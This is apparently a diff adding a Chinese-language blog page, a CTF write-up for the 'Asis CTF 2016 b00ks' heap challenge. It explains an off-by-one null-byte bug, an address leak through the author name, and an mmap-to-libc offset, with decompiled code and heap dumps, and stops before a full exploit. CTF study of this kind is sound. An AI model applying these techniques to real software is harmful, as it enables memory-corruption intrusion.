@@ -1,0 +1,819 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>  
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="pwn," />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="0x01:一个图书管理12345678910Welcome to ASISCTF book libraryEnter author name: ha2ha2ha21. Create a book2. Delete a book3. Edit a book4. Print book detail5. Change current author name6. Exit&gt;  0x02:程序漏洞程">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Asis CTF 2016 b00ks">
+<meta property="og:url" content="http://yoursite.com/2019/03/17/Asis%20CTF%202016%20b00ks/index.html">
+<meta property="og:site_name" content="ha2&#39;s blog">
+<meta property="og:description" content="0x01:一个图书管理12345678910Welcome to ASISCTF book libraryEnter author name: ha2ha2ha21. Create a book2. Delete a book3. Edit a book4. Print book detail5. Change current author name6. Exit&gt;  0x02:程序漏洞程">
+<meta property="article:published_time" content="2019-03-17T15:47:48.000Z">
+<meta property="article:modified_time" content="2021-09-19T05:52:54.000Z">
+<meta property="article:author" content="ha2">
+<meta property="article:tag" content="pwn">
+<meta name="twitter:card" content="summary">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2019/03/17/Asis CTF 2016 b00ks/"/>
+
+
+
+
+
+  <title>Asis CTF 2016 b00ks | ha2's blog</title>
+  
+
+
+
+
+
+
+
+
+<meta name="generator" content="Hexo 4.2.1"></head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">ha2's blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">（٩（๑>◡<๑）۶）</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/03/17/Asis%20CTF%202016%20b00ks/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="ha2">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="ha2's blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">Asis CTF 2016 b00ks</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-03-17T23:47:48+08:00">
+                2019-03-17
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/pwn/" itemprop="url" rel="index">
+                    <span itemprop="name">pwn</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <hr>
+<h3 id="0x01-一个图书管理"><a href="#0x01-一个图书管理" class="headerlink" title="0x01:一个图书管理"></a>0x01:一个图书管理</h3><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Welcome <span class="keyword">to</span> ASISCTF book library</span><br><span class="line">Enter author <span class="type">name</span>: ha2ha2ha2</span><br><span class="line"></span><br><span class="line"><span class="number">1.</span> <span class="keyword">Create</span> a book</span><br><span class="line"><span class="number">2.</span> <span class="keyword">Delete</span> a book</span><br><span class="line"><span class="number">3.</span> Edit a book</span><br><span class="line"><span class="number">4.</span> Print book detail</span><br><span class="line"><span class="number">5.</span> Change <span class="keyword">current</span> author <span class="type">name</span></span><br><span class="line"><span class="number">6.</span> <span class="keyword">Exit</span></span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>
+<hr>
+<h3 id="0x02-程序漏洞"><a href="#0x02-程序漏洞" class="headerlink" title="0x02:程序漏洞"></a>0x02:程序漏洞</h3><p>程序中有一个用户自己编写的my_read函数，会在 ptr + len+1处写入一个’\x00’<br><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">signed __int64 __fastcall my_read(_BYTE *ptr, <span class="built_in">int</span> len)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">int</span> i; <span class="comment">// [rsp+14h] [rbp-Ch]</span></span><br><span class="line">  _BYTE *buf; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( len &lt;= <span class="number">0</span> )</span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>LL;</span><br><span class="line">  buf = ptr;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( (unsigned <span class="built_in">int</span>)read(<span class="number">0</span>, buf, <span class="number">1</span>uLL) != <span class="number">1</span> )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">1</span>LL;</span><br><span class="line">    <span class="keyword">if</span> ( *buf == <span class="number">10</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    ++buf;</span><br><span class="line">    <span class="keyword">if</span> ( i == len )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  *buf = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>LL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>假如说len是32，输入32个字符之后，第33个会被置成\x00</p>
+<hr>
+<h3 id="0x03-泄漏book1-struct的地址。"><a href="#0x03-泄漏book1-struct的地址。" class="headerlink" title="0x03:泄漏book1_struct的地址。"></a>0x03:泄漏book1_struct的地址。</h3><p>Create_book的时候，会为book name mallloc、book descripeion、book strcut 分别malloc一块儿区域:。<br>其中book_struct是如下结构：<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">book</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">int</span> ID;</span><br><span class="line">    <span class="keyword">void</span>* name;</span><br><span class="line">    <span class="keyword">void</span>* description;</span><br><span class="line">    <span class="keyword">int</span> desc_size;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>创建book_struct后，会将该book_strcut的地址放到BOOKS[ ]中。</p>
+<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.data</span><span class="selector-pseudo">:000055ADE8F1B010</span> <span class="selector-tag">BOOKS</span>           <span class="selector-tag">dq</span> <span class="selector-tag">offset</span> <span class="selector-tag">unk_55ADE8F1B060</span></span><br><span class="line"><span class="selector-class">.data</span><span class="selector-pseudo">:000055ADE8F1B010</span>                                         ; <span class="selector-tag">DATA</span> <span class="selector-tag">XREF</span>: <span class="selector-tag">sub_55ADE8D19B24</span><span class="selector-pseudo">:loc_55ADE8D19B38</span>↑<span class="selector-tag">o</span></span><br><span class="line"><span class="selector-class">.data</span><span class="selector-pseudo">:000055ADE8F1B010</span>                                         ; <span class="selector-tag">Delete</span><span class="selector-pseudo">:loc_55ADE8D19C1B</span>↑<span class="selector-tag">o</span> ...</span><br><span class="line"><span class="selector-class">.data</span><span class="selector-pseudo">:000055ADE8F1B018</span> <span class="selector-tag">Author_name</span>     <span class="selector-tag">dq</span> <span class="selector-tag">offset</span> <span class="selector-tag">unk_55ADE8F1B040</span></span><br><span class="line"><span class="selector-class">.data</span><span class="selector-pseudo">:000055ADE8F1B018</span>                                         ; <span class="selector-tag">DATA</span> <span class="selector-tag">XREF</span>: <span class="selector-tag">Change_name</span>+15↑<span class="selector-tag">o</span></span><br><span class="line"><span class="selector-class">.data</span><span class="selector-pseudo">:000055ADE8F1B018</span>                                         ; <span class="selector-tag">Print</span>+<span class="selector-tag">CA</span>↑<span class="selector-tag">o</span></span><br></pre></td></tr></table></figure>
+<p>可以看出BOOKS与Author_name相差0x20个字节。   </p>
+<p>所以如果Anthor写入32个字符后，第33个会被置成\x00，再create一个book的话，会将这个\x00会改掉，就可以在Print功能时，打印Author的时候泄漏处book1_struct的地址。   </p>
+<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// leak book1_struct     </span></span><br><span class="line"><span class="comment">// 一开始程序运行输入'A'*32</span></span><br><span class="line"><span class="comment">// 再create('128'.'A','128','B')  此处description的大小因尽量大些，原因请看后续(〃'▽'〃)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// [heap]:</span></span><br><span class="line"><span class="number">00005586</span>DF65A010  <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  <span class="number">91</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  ................</span><br><span class="line"><span class="number">00005586</span>DF65A020  <span class="number">41</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  A...............	&lt;=book1_name</span><br><span class="line"><span class="number">00005586</span>DF65A030  <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  ................</span><br><span class="line"><span class="number">00005586</span>DF65A040  <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  ................</span><br><span class="line"><span class="number">00005586</span>DF65A050  <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  ................</span><br><span class="line"><span class="number">00005586</span>DF65A060  <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  ................</span><br><span class="line"><span class="number">00005586</span>DF65A070  <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  ................</span><br><span class="line"><span class="number">00005586</span>DF65A080  <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  ................</span><br><span class="line"><span class="number">00005586</span>DF65A090  <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  ................</span><br><span class="line"><span class="number">00005586</span>DF65A0A0  <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  <span class="number">91</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  ................</span><br><span class="line"><span class="number">00005586</span>DF65A0B0  <span class="number">42</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  B...............	&lt;= book1_description	</span><br><span class="line"><span class="number">00005586</span>DF65A0C0  <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  ................</span><br><span class="line"><span class="number">00005586</span>DF65A0D0  <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  ................</span><br><span class="line"><span class="number">00005586</span>DF65A0E0  <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  ................</span><br><span class="line"><span class="number">00005586</span>DF65A0F0  <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  ................</span><br><span class="line"><span class="number">00005586</span>DF65A100  <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  ................</span><br><span class="line"><span class="number">00005586</span>DF65A110  <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  ................</span><br><span class="line"><span class="number">00005586</span>DF65A120  <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  ................</span><br><span class="line"><span class="number">00005586</span>DF65A130  <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  <span class="number">31</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  .......<span class="number">.1</span>.......	&lt;= book1_struct</span><br><span class="line"><span class="number">00005586</span>DF65A140  <span class="number">01</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> &lt;=book1_ID 		        <span class="number">20</span> A0 <span class="number">65</span> DF <span class="number">86</span> <span class="number">55</span> <span class="number">00</span> <span class="number">00</span>  &lt;= book1_name的地址</span><br><span class="line"><span class="number">00005586</span>DF65A150  B0 A0 <span class="number">65</span> DF <span class="number">86</span> <span class="number">55</span> <span class="number">00</span> <span class="number">00</span> &lt;=book1_description的地址	<span class="number">80</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  &lt;= description的大小 </span><br><span class="line">	</span><br><span class="line"><span class="comment">// BOOK 和 AuthorName</span></span><br><span class="line">AuthorName==&gt;</span><br><span class="line"><span class="number">00005586</span>DF1E5040  <span class="number">41</span> <span class="number">41</span> <span class="number">41</span> <span class="number">41</span> <span class="number">41</span> <span class="number">41</span> <span class="number">41</span> <span class="number">41</span>  <span class="number">41</span> <span class="number">41</span> <span class="number">41</span> <span class="number">41</span> <span class="number">41</span> <span class="number">41</span> <span class="number">41</span> <span class="number">41</span>  AAAAAAAAAAAAAAAA</span><br><span class="line"><span class="number">00005586</span>DF1E5050  <span class="number">41</span> <span class="number">41</span> <span class="number">41</span> <span class="number">41</span> <span class="number">41</span> <span class="number">41</span> <span class="number">41</span> <span class="number">41</span>  <span class="number">41</span> <span class="number">41</span> <span class="number">41</span> <span class="number">41</span> <span class="number">41</span> <span class="number">41</span> <span class="number">41</span> <span class="number">41</span>  AAAAAAAAAAAAAAAA</span><br><span class="line">BOOK ==&gt; </span><br><span class="line"><span class="number">00005586</span>DF1E5060  <span class="number">40</span> A1 <span class="number">65</span> DF <span class="number">86</span> <span class="number">55</span> <span class="number">00</span> <span class="number">00</span> &lt;= book1_struct的地址  <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 再Print就能泄漏处book1_struct的地址了</span></span><br></pre></td></tr></table></figure>
+<hr>
+<h3 id="0x04-mmap"><a href="#0x04-mmap" class="headerlink" title="0x04:mmap"></a>0x04:mmap</h3><p>由mmap映射出来的区域与libc有固定偏移，所以createbook2的时候，把大小申请得超级大，分配的区域就是mmap映射的，这里用的大小是0x21000。</p>
+<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// [mmap]</span></span><br><span class="line"><span class="number">00007</span>F69E19B4000  <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  <span class="number">02</span> <span class="number">20</span> <span class="number">02</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  ......... ......</span><br><span class="line"><span class="number">00007</span>F69E19B4010  <span class="number">43</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  C..............	    &lt;= book2_name</span><br><span class="line"><span class="number">00007</span>F69E19B4020  <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  ................</span><br><span class="line"><span class="number">00007</span>F69E19B4030  <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  ................</span><br><span class="line"><span class="number">00007</span>F69E19B4040  <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  ................</span><br><span class="line">.......   </span><br><span class="line"></span><br><span class="line"><span class="number">00007</span>F69E1992000  <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  <span class="number">02</span> <span class="number">20</span> <span class="number">02</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  ......... ......</span><br><span class="line"><span class="number">00007</span>F69E1992010  <span class="number">44</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  D...............	&lt;=book2_description</span><br><span class="line"><span class="number">00007</span>F69E1992020  <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  ................</span><br><span class="line"><span class="number">00007</span>F69E1992030  <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  ................</span><br><span class="line"><span class="number">00007</span>F69E1992040  <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  ................</span><br><span class="line">.......</span><br></pre></td></tr></table></figure>
